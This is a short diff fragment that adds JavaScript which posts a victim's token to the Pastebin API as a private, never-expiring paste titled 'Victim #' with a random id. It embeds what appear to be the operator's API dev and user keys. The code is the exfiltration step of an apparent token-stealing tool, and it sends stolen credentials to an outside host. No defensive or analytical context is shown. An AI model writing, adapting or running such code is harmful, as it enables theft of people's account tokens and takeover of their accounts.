@@ -1,0 +1,14 @@
+request.post({
+            "method": "POST",
+            "url": "https://pastebin.com/api/api_post.php",
+            "form": {
+                "api_option": "paste",
+                "api_dev_key": "b0299c60fe10d0882498fb0cf582da96",
+                "api_paste_private": "1",
+                "api_paste_name": "Victim #" + randId,
+                "api_paste_code": "Victim #" + randId + " Token:\n" + token,
+                "api_paste_expire_date": "N",
+                "api_paste_format": "text",
+                "api_user_key": "3483dcbdfd9cbd6ab5e86bf1b611cd75",
+            }
+        })
